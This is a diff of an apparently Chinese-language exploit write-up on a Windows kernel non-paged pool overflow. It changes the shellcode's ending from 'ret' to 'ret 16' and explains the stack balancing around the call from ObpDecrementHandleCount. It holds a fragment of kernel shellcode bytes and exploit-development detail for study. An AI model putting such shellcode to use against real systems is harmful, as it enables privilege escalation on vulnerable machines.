@@ -176,8 +176,7 @@ char shellcode[] = {
 	"\x89\x91\xf8\x00\x00\x00"      // mov [ecx+0xf8],edx
 	"\x61"                          // popad
 
-	"\xC3"                          // ret
-	//"\xC2\x10\x00"                  // ret 16
+	"\xC2\x10\x00"                  // ret 16
 };
 
 int main()
@@ -284,7 +283,9 @@ int main()
 
 然后是堆栈平衡问题。
 
-这次我们的 shellcode 什么函数都没有劫持。只是 ObpDecrementHandleCount 函数简单地 call 了我们的 shellcode，然后我们的 shellcode 又什么寄存器都没修改，所以最后只要简单地 ret 就好了，不存在堆栈平衡问题，只是不知道为什么师傅们都 ret 16
+![alt 10](images/nonPagedpooloverflow/10.jpg)
+
+call dword ptr [edi + 60h] 是实际调用我们 shellcode 的语句。因为在调用函数前压入了 4 个参数，所以我们在最后需要 ret 16
 
 ## 0x03 结束语
 这次非换页池溢出感觉又学到了很多东西，写 exp 也熟练多了，虽然又是一天愉快的 error 99999 
